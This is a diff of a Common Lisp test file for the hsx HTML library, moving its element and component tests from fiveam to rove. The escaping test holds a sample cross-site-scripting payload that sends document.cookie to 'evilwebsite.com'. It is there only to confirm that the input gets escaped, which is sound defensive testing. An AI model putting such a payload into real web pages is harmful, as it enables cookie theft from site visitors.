@@ -1,145 +1,143 @@
 (defpackage #:hsx-test/element
   (:use #:cl
-        #:fiveam
+        #:rove
         #:hsx/element)
   (:import-from #:named-readtables
                 #:in-readtable)
   (:import-from #:mstrings
                 #:mstring-syntax))
 (in-package #:hsx-test/element)
+
 (in-readtable mstring-syntax)
 
-(def-suite element-test)
-(in-suite element-test)
+(deftest tag-test
+  (testing "element-class"
+    (ok (typep (create-element :div nil nil) 'tag))
+    (ok (typep (create-element :html nil nil) 'html-tag))
+    (ok (typep (create-element :img nil nil) 'self-closing-tag))
+    (ok (typep (create-element :style nil nil) 'non-escaping-tag))
+    (ok (typep (create-element :<> nil nil) 'fragment))
+    (ok (typep (create-element (lambda ()) nil nil) 'component))
+    (ok (signals (create-element "div" nil nil))))
 
-(test element-class
-  (is (typep (create-element :div nil nil) 'tag))
-  (is (typep (create-element :html nil nil) 'html-tag))
-  (is (typep (create-element :img nil nil) 'self-closing-tag))
-  (is (typep (create-element :style nil nil) 'non-escaping-tag))
-  (is (typep (create-element :<> nil nil) 'fragment))
-  (is (typep (create-element (lambda ()) nil nil) 'component))
-  (signals error (create-element "div" nil nil)))
-
-(test flatten-children
-  (let* ((elm (create-element :p
-                              nil
-                              (list "a"
-                                    nil
-                                    (list "b" (list nil "c"))
-                                    (cons "d" "e")))))
-    (is (equal (list "a" "b" "c" "d" "e") (element-children elm)))))
-
-(test empty-element
-  (is (string= "<div></div>"
-               (render-to-string (create-element :div nil nil)))))
-
-(test element-with-props
-  (is (string= "<div prop1=\"value1\" prop2></div>"
-               (render-to-string (create-element :div 
-                                                 (list :prop1 "value1"
-                                                       :prop2 t
-                                                       :prop3 nil)
-                                                 nil)))))
-
-(test element-with-children
-  (is (string= "<p>foo</p>"
-               (render-to-string (create-element :p
-                                                 nil
-                                                 (list "foo"))
-                                 :pretty t)))
-  (is (string= #M"<p>
+  (testing "flatten-children"
+    (let* ((elm (create-element :p
+                                nil
+                                (list "a"
+                                      nil
+                                      (list "b" (list nil "c"))
+                                      (cons "d" "e")))))
+      (ok (equal (list "a" "b" "c" "d" "e") (element-children elm)))))
+  
+  (testing "empty-element"
+    (ok (string= "<div></div>"
+                 (render-to-string (create-element :div nil nil)))))
+  
+  (testing "element-with-props"
+    (ok (string= "<div prop1=\"value1\" prop2></div>"
+                 (render-to-string (create-element :div
+                                                   (list :prop1 "value1"
+                                                         :prop2 t
+                                                         :prop3 nil)
+                                                   nil)))))
+  
+  (testing "element-with-children"
+    (ok (string= "<p>foo</p>"
+                 (render-to-string (create-element :p
+                                                   nil
+                                                   (list "foo"))
+                                   :pretty t)))
+    (ok (string= #M"<p>
                  \  <span>foo</span>
                   </p>"
-               (render-to-string (create-element :p
-                                                 nil
-                                                 (list (create-element :span
-                                                                       nil
-                                                                       (list "foo"))))
-                                 :pretty t)))
-  (is (string= #M"<p>
+                 (render-to-string (create-element :p
+                                                   nil
+                                                   (list (create-element :span
+                                                                         nil
+                                                                         (list "foo"))))
+                                   :pretty t)))
+    (ok (string= #M"<p>
                  \  foo
                  \  <span>bar</span>
                   </p>"
-               (render-to-string (create-element :p
-                                                 nil
-                                                 (list "foo"
-                                                       (create-element :span
-                                                                       nil
-                                                                       (list "bar"))))
-                                 :pretty t))))
+                 (render-to-string (create-element :p
+                                                   nil
+                                                   (list "foo"
+                                                         (create-element :span
+                                                                         nil
+                                                                         (list "bar"))))
+                                   :pretty t))))
 
-(test element-with-props-and-children
-  (is (string=  "<p prop1=\"value1\" prop2>foo</p>"
-                (render-to-string (create-element :p
-                                                  (list :prop1 "value1"
-                                                        :prop2 t
-                                                        :prop3 nil)
-                                                  (list "foo"))
-                                  :pretty t)))
-  (is (string= #M"<p prop1=\"value1\" prop2>
+  (testing "element-with-props-and-children"
+    (ok (string= "<p prop1=\"value1\" prop2>foo</p>"
+                 (render-to-string (create-element :p
+                                                   (list :prop1 "value1"
+                                                         :prop2 t
+                                                         :prop3 nil)
+                                                   (list "foo"))
+                                   :pretty t)))
+    (ok (string= #M"<p prop1=\"value1\" prop2>
                  \  foo
                  \  <span>bar</span>
                   </p>"
-               (render-to-string  (create-element :p
-                                                  (list :prop1 "value1"
-                                                        :prop2 t
-                                                        :prop3 nil)
-                                                  (list "foo"
-                                                        (create-element :span
-                                                                        nil
-                                                                        "bar")))
-                                  :pretty t))))
-
-(test self-closing-tag
-  (is (string= "<img src=\"/background.png\">"
-               (render-to-string (create-element :img
-                                                 (list :src "/background.png")
-                                                 nil)
-                                 :pretty t))))
-
-(test escaping-tag
-  (is (string= "<div>&lt;script&gt;fetch(&#x27;evilwebsite.com&#x27;, { method: &#x27;POST&#x27;, body: document.cookie })&lt;&#x2F;script&gt;</div>"
-               (render-to-string
-                (create-element :div
-                                nil
-                                (list "<script>fetch('evilwebsite.com', { method: 'POST', body: document.cookie })</script>"))))))
-
-(test non-escaping-tag
-  (is (string= "<script>alert('<< Do not embed user-generated contents here! >>')</script>"
-               (render-to-string
-                (create-element :script
-                                nil
-                                "alert('<< Do not embed user-generated contents here! >>')")))))
-
-(test fragment
-  (let ((frg (create-element :<>
-                             nil
-                             (list (create-element :li
-                                                   nil
-                                                   (list "bar"))
-                                   (create-element :li
-                                                   nil
-                                                   (list "baz"))))))
-    (is (string= #M"<li>bar</li>
+                 (render-to-string  (create-element :p
+                                                    (list :prop1 "value1"
+                                                          :prop2 t
+                                                          :prop3 nil)
+                                                    (list "foo"
+                                                          (create-element :span
+                                                                          nil
+                                                                          "bar")))
+                                    :pretty t))))
+  (testing "self-closing-tag"
+    (ok (string= "<img src=\"/background.png\">"
+                 (render-to-string (create-element :img
+                                                   (list :src "/background.png")
+                                                   nil)
+                                   :pretty t))))
+  
+  (testing "escaping-tag"
+    (ok (string= "<div>&lt;script&gt;fetch(&#x27;evilwebsite.com&#x27;, { method: &#x27;POST&#x27;, body: document.cookie })&lt;&#x2F;script&gt;</div>"
+                 (render-to-string
+                  (create-element :div
+                                  nil
+                                  (list "<script>fetch('evilwebsite.com', { method: 'POST', body: document.cookie })</script>"))))))
+  
+  (testing "non-escaping-tag"
+    (ok (string= "<script>alert('<< Do not embed user-generated contents here! >>')</script>"
+                 (render-to-string
+                  (create-element :script
+                                  nil
+                                  "alert('<< Do not embed user-generated contents here! >>')")))))
+  
+  (testing "fragment"
+    (let ((frg (create-element :<>
+                               nil
+                               (list (create-element :li
+                                                     nil
+                                                     (list "bar"))
+                                     (create-element :li
+                                                     nil
+                                                     (list "baz"))))))
+      (ok (string= #M"<li>bar</li>
                     <li>baz</li>"
-                 (render-to-string frg :pretty t)))
-    (is (string= #M"<ul>
+                   (render-to-string frg :pretty t)))
+      (ok (string= #M"<ul>
                    \  <li>foo</li>
                    \  <li>bar</li>
                    \  <li>baz</li>
                    \  <li>brah</li>
                     </ul>"
-                 (render-to-string (create-element :ul
-                                                   nil
-                                                   (list (create-element :li
-                                                                         nil
-                                                                         (list "foo"))
-                                                         frg
-                                                         (create-element :li
-                                                                         nil
-                                                                         (list "brah"))))
-                                   :pretty t)))))
+                   (render-to-string (create-element :ul
+                                                     nil
+                                                     (list (create-element :li
+                                                                           nil
+                                                                           (list "foo"))
+                                                           frg
+                                                           (create-element :li
+                                                                           nil
+                                                                           (list "brah"))))
+                                     :pretty t))))))
 
 (defun comp1 (&key prop children)
   (create-element :div
@@ -147,25 +145,11 @@
                   (list prop
                         children)))
 
-(test component-accepting-keyword-args
-  (let ((elm (expand-component (create-element #'comp1
-                                               '(:prop "value")
-                                               (list "child")))))
-    (is (eq :div (element-type elm)))
-    (is (equal (list "value" "child") (element-children elm)))))
-
 (defun comp2 (&rest props)
   (create-element :div
                   nil
                   (list (getf props :prop)
                         (getf props :children))))
-
-(test component-accepting-property-list
-  (let ((elm (expand-component (create-element #'comp2
-                                               '(:prop "value")
-                                               (list "child")))))
-    (is (eq :div (element-type elm)))
-    (is (equal (list "value" "child") (element-children elm)))))
 
 (defun comp3 (&rest props &key prop children &allow-other-keys)
   (create-element :div
@@ -174,9 +158,24 @@
                         children
                         (getf props :other-key))))
 
-(test component-accepting-keyword-args-and-property-list
-  (let ((elm (expand-component (create-element #'comp3
-                                               '(:prop "value" :other-key "other")
-                                               (list "child")))))
-    (is (eq :div (element-type elm)))
-    (is (equal (list "value" "child" "other") (element-children elm)))))
+(deftest component-test
+  (testing "component-accepting-keyword-args"
+    (let ((elm (expand-component (create-element #'comp1
+                                                 '(:prop "value")
+                                                 (list "child")))))
+      (ok (eq :div (element-type elm)))
+      (ok (equal (list "value" "child") (element-children elm)))))
+  
+  (testing "component-accepting-property-list"
+    (let ((elm (expand-component (create-element #'comp2
+                                                 '(:prop "value")
+                                                 (list "child")))))
+      (ok (eq :div (element-type elm)))
+      (ok (equal (list "value" "child") (element-children elm)))))
+  
+  (testing "component-accepting-keyword-args-and-property-list"
+    (let ((elm (expand-component (create-element #'comp3
+                                                 '(:prop "value" :other-key "other")
+                                                 (list "child")))))
+      (ok (eq :div (element-type elm)))
+      (ok (equal (list "value" "child" "other") (element-children elm))))))
